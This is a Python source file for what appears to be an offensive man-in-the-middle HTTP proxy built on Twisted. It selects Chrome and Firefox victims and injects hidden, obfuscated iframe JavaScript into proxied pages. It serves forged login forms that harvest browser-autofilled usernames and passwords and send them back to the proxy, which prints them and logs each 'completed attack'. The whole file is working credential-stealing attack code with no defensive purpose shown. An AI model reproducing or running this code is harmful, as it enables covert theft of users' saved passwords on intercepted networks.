
import urlparse, os, sys, random, time
from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory
from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from PersistentData import PersistentData

class ClientRequest(Request):

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       	     = reactor
        self.PersistentData      = PersistentData.getInstance()
   
  
    def lupinRequest(self,host):
        return defer.succeed(host)

    def resolveHost(self, host):
        if host in self.PersistentData.dnsCache:
            return defer.succeed(self.PersistentData.dnsCache[host])
        else:
            return reactor.resolve(host)

    def errorResolvingHost(self, error): 
        self.shutDown()

    def process(self):
        host        = self.getHeader('host') 
        path        = self.getPath()       	
        
        if self.PersistentData._LUPIN_TOKEN in path:
            deferred = self.lupinRequest(host)
            deferred.addCallback(self.processLupinRequest)
        else:
            deferred = self.resolveHost(host)
            deferred.addCallback(self.processUserRequest)
            deferred.addErrback(self.errorResolvingHost)
    
    
    def processLupinRequest(self, host):
        
        path        = self.getPath()
	    
        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._FRAME in path:
            self.sendMasterIframe()
            return	


        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._FORGERY in path:     
            self.sendForgedResponse(host) 
            return

        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY in path:
            k 	= path.find(self.PersistentData._LUPIN_TOKEN)
            print path[k+len(self.PersistentData._LUPIN_TOKEN)+2:]
            self.sendMoveSlaveSrc()
            return

        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._DESTRUCT in path:
            client = self.getClientIP()
            self.sendTearDown(client)
            #self.PersistentData.addVictim(client)
            return

    def processUserRequest(self, address):
        host              = self.getHeader("host")
        path              = self.getPath()      
        headers           = self.stripEncodingHeader()
        self.content.seek(0,0)
        postData          = self.content.read()
        actAs			  = self.proxyBehavior(host,path) 
        
        self.PersistentData.addDnsCache(host, address)
	
        if actAs == self.PersistentData._404:
            self.send404(host)
            return
        
        self.proxyRequest(address, self.method, path, postData, actAs, headers)           



    def proxyBehavior(self,host,path):
      
        client            = self.getClientIP()  
        agent             = self.getHeader("user-agent").upper()

		
        if "CHROME/" not in agent and "FIREFOX/" not in agent:
            return self.PersistentData._PROXY
  
        if self.PersistentData.oldVictim(client):
            return self.PersistentData._PROXY

        if self.method != "GET":
            return self.PersistentData._PROXY

        lastAttack = 0
        if client in self.PersistentData.lastAttackTime:
            lastAttack = self.PersistentData.lastAttackTime[client]
        if time.time() - lastAttack < 60:
            return self.PersistentData._PROXY
		
        if "google-analytics" in host or "favicon.ico" in path:
            return self.PersistentData._404

        if len(path) > 50:
            return self.PersistentData._PROXY
	
        if "google" in host and "/complete/search?" in path:
            return self.PersistentData._PROXY

        if '.' in path and ".html" not in path and ".php" not in path:
            return self.PersistentData._PROXY
	
        return self.PersistentData._LUPIN



    def proxyRequest(self, host, method, path, postData,actAs,headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)
     


    def sendMoveSlaveSrc(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        self.write("<html><head></head><body><script type='text/javascript'>window.parent.postMessage(window.name, '*');</script></body></html>")  
        self.shutDown() 


		
    def send404(self,host):
        self.setResponseCode(404, "Not Found")
        self.setHeader("Connection", "close")  
        self.write("<html><head></head><body>404"+host+"</body></html>")    
        self.shutDown() 



    def sendTearDown(self, client):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 
        self.write("<html><head><script type='text/javascript'>window.parent.postMessage('_td_','*');</script></head><body></body></html>")
        self.shutDown()   
        print "Completed attack on "+client
   
     
    def sendForgedResponse(self,host):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        action = self.PersistentData.loginActions[host]
        data = "<html><head></head><body><form method='POST' action="+action+"><input type='text' name='user'/><input type='password' name='pass'/></form><script type='text/javascript'>function _a(){a=document.getElementsByName('user')[0].value;b=document.getElementsByName('pass')[0].value;c=location.hostname;if(b.length>0){d='?"+self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY+"='+c+'|'+a+'|'+b;document.location.replace(d);}else window.parent.postMessage(window.name,'*');}setTimeout('_a()',100);</script></body></html>"
        self.write(data)
        self.shutDown()
     
 
    def sendMasterIframe(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        masterIframe =  "<html><head><script type='text/javascript'>"+self.PersistentData.masterIframeVars+"var g1=0;var g2=10;var g3=new Array(g2);var g4=false;var g5=0;function _1(string){var a=string.split('.');var b='';for(var i=0;i<a.length;i++){var c=parseInt(a[i])+40;b+=String.fromCharCode(c);}return b;}function _2(a){var b='_sf'+a.toString();var c=document.getElementsByName(b)[0];var d=p8[g3[a]];if(g4)return;g3[a]+=g2;if(p3)d=_1(d);c.setAttribute('src','http://'+d+'?'+p0+p1);}function _3(a){var b=document.createElement('IFRAME');b.setAttribute('height','0');b.setAttribute('width','0');b.setAttribute('style','visibility:hidden;display:none');b.setAttribute('name','_sf'+a.toString());document.body.appendChild(b);}function _4(){if(p5==false&&g4)return;var a=g5;var b=new Date();g5=b.getTime();if(g5-a<p6)return;for(var j=0;j<g2;j++)if(g3[j]<p8.length)_2(j);}function _5(a){var b=a.data;if(b.indexOf('focus')!=-1){if(p4==false)g4=true;return;}if(b.indexOf('blur')!=-1){if(p4==false){g4=false;if(p6<10000)setTimeout('_4()',10000);else setTimeout('_4()',p6);}return;}g1+=1;if(g1==p8.length){document.location.replace(document.location.hostname+'?'+p0+p2);return;}var c=parseInt(b.substring(3));if(g4==true||g3[c]>=p8.length)return;var d=new Date();if(d.getTime()-g5<p7)_2(c);else if(p5==true){p5=false;g4=true;}else setTimeout('_4()',p6);}function _6(){for(var k=0;k<g2;k++){g3[k]=k;_3(k);}if(p4==true||p5==true)_4();window.addEventListener('message',_5,false);}</script></head><body onload='_6();'></body></html>"
        self.write(masterIframe)
        self.shutDown()
		
		
    def stripEncodingHeader(self):
        headers = self.getAllHeaders().copy()        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        return headers


    def getPath(self):
        if self.uri.startswith("http://"):
            index = self.uri.find('/', 7)
            return self.uri[index:]
        return self.uri        	
		
		
    def shutDown(self):
        try:
            self.finish()
        except RuntimeError:
            pass
			
